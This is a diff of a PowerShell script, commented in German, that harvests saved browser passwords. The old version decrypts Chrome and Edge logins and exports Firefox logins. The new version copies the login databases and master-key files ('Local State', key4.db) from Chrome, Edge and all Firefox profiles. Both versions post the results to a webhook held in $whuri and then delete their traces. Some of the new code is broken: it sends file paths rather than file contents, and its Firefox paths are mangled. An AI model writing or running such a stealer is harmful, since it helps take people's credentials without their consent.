@@ -1,94 +1,95 @@
-# Funktion zum Entschlüsseln von verschlüsselten Passwörtern in Chromium-basierten Browsern (Chrome, Edge)
-function Get-ChromiumPasswords {
+# Logging-Funktion
+function Write-Log {
     param (
-        [string]$browserPath,
-        [string]$browserName
+        [string]$message
+    )
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    Write-Output "$timestamp - $message"
+}
+
+# Funktion zum Kopieren von Dateien und Senden von Daten
+function Copy-And-Send {
+    param (
+        [string]$browserName,
+        [string]$dbPath,
+        [string]$masterKeyPath,
+        [string]$profileName = ""
     )
 
-    $localAppData = [System.Environment]::GetFolderPath('LocalApplicationData')
-    $dbPath = "$localAppData\$browserPath\User Data\Default\Login Data"
-    $tempDb = "$env:TEMP\${browserName}_Login Data"
+    $tempDb = "$env:TEMP\${browserName}_${profileName}_Login Data"
+    $tempMasterKey = "$env:TEMP\${browserName}_${profileName}_MasterKey"
 
-    # Kopieren der Datenbank, um Sperren zu vermeiden
+    # Kopieren der Datenbank und des Masterkeys, um Sperren zu vermeiden
     if (Test-Path $dbPath) {
         Copy-Item $dbPath $tempDb -Force
+        Write-Log "Copied database for $browserName ($profileName)"
     } else {
-        Write-Host "Datenbankpfad nicht gefunden: $dbPath"
-        return @()
+        Write-Log "Database path not found for $browserName ($profileName): $dbPath"
+        return
     }
 
-    # Verbindung zur SQLite-Datenbank herstellen
-    Add-Type -AssemblyName System.Data.SQLite
-    $connectionString = "Data Source=$tempDb;Version=3;"
-    $query = "SELECT origin_url, username_value, password_value FROM logins"
-
-    # SQLite-Datenbank abfragen
-    $connection = New-Object System.Data.SQLite.SQLiteConnection
-    $connection.ConnectionString = $connectionString
-    $connection.Open()
-
-    $command = $connection.CreateCommand()
-    $command.CommandText = $query
-    $reader = $command.ExecuteReader()
-
-    $passwords = @()
-    while ($reader.Read()) {
-        $url = $reader["origin_url"]
-        $username = $reader["username_value"]
-        $encryptedPassword = $reader["password_value"]
-
-        # Entschlüsseln des Passworts
-        $entropy = [byte[]](0)
-        $decryptedPassword = [System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($encryptedPassword), $entropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-        $password = [System.Text.Encoding]::UTF8.GetString($decryptedPassword)
-
-        $passwords += [PSCustomObject]@{ URL = $url; Username = $username; Password = $password }
+    if (Test-Path $masterKeyPath) {
+        Copy-Item $masterKeyPath $tempMasterKey -Force
+        Write-Log "Copied master key for $browserName ($profileName)"
+    } else {
+        Write-Log "Master key path not found for $browserName ($profileName): $masterKeyPath"
+        return
     }
 
-    $reader.Close()
-    $connection.Close()
+    # JSON-Payload erstellen
+    $JsonPayload = @{
+        "browser" = $browserName
+        "profile" = $profileName
+        "dbPath" = $tempDb
+        "masterKeyPath" = $tempMasterKey
+    } | ConvertTo-Json
+
+    # Daten an Webhook senden
+    $Parameters = @{
+        "Uri"         = $whuri
+        "Method"      = "POST"
+        "Body"        = $JsonPayload
+        "ContentType" = "application/json"
+    }
+
+    Invoke-RestMethod @Parameters
+    Write-Log "Sent data for $browserName ($profileName)"
+
+    # Temporäre Dateien löschen
     Remove-Item $tempDb -Force
-
-    return $passwords
+    Remove-Item $tempMasterKey -Force
 }
 
-# Funktion zum Exportieren von Passwörtern aus Firefox
-function Export-FirefoxPasswords {
-    $TopDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
-    $DefaultProfileDir = (Get-ChildItem -LiteralPath $TopDir -Directory | Where-Object { $_.FullName -match '\.default' }).FullName
-    $ExportPath = "$env:TEMP\firefox_passwords.csv"
-    Start-Process -FilePath "firefox.exe" -ArgumentList "-headless", "-profile", $DefaultProfileDir, "-new-instance", "about:logins?action=export" -Wait
-    
-    # Warten, bis die Datei erstellt wurde
-    Start-Sleep -Seconds 5
-    
-    return Import-Csv $ExportPath
+# Pfade der Browser-Datenbanken und Masterkeys
+$browserPaths = @{
+    "Edge" = @{
+        "dbPath" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
+        "masterKeyPath" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+    }
+    "Chrome" = @{
+        "dbPath" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        "masterKeyPath" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+    }
 }
 
-# Passwörter exportieren
-$EdgePasswords = Get-ChromiumPasswords -browserPath "Microsoft\Edge" -browserName "Edge"
-$ChromePasswords = Get-ChromiumPasswords -browserPath "Google\Chrome" -browserName "Chrome"
-$FirefoxPasswords = Export-FirefoxPasswords
-
-# Alle Passwörter kombinieren
-$AllPasswords = $EdgePasswords + $ChromePasswords + $FirefoxPasswords
-
-# JSON-Payload erstellen
-$JsonPayload = @{
-    "passwords" = $AllPasswords
-} | ConvertTo-Json
-
-# Daten an Webhook senden
-$Parameters = @{
-    "Uri"         = $whuri
-    "Method"      = "POST"
-    "Body"        = $JsonPayload
-    "ContentType" = "application/json"
+# Kopieren und Senden für jeden Browser außer Firefox
+foreach ($browser in $browserPaths.Keys) {
+    $paths = $browserPaths[$browser]
+    Copy-And-Send -browserName $browser -dbPath $paths.dbPath -masterKeyPath $paths.masterKeyPath
 }
 
-Invoke-RestMethod @Parameters
+# Spezielle Behandlung für Firefox
+$firefoxProfileDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
+if (Test-Path $firefoxProfileDir) {
+    $profiles = Get-ChildItem -Path $firefoxProfileDir -Directory
+    foreach ($profile in $profiles) {
+        $profileName = $profile.Name
+        $dbPath = "$profile.FullName\logins.json"
+        $masterKeyPath = "$profile.FullName\key4.db"
+        Copy-And-Send -browserName "Firefox" -dbPath $dbPath -masterKeyPath $masterKeyPath -profileName $profileName
+    }
+} else {
+    Write-Log "Firefox profile directory not found: $firefoxProfileDir"
+}
 
-# Temporäre CSV-Dateien löschen
-Remove-Item "$env:TEMP\edge_passwords.csv" -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\chrome_passwords.csv" -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\firefox_passwords.csv" -ErrorAction SilentlyContinue
+Write-Log "Script execution completed"
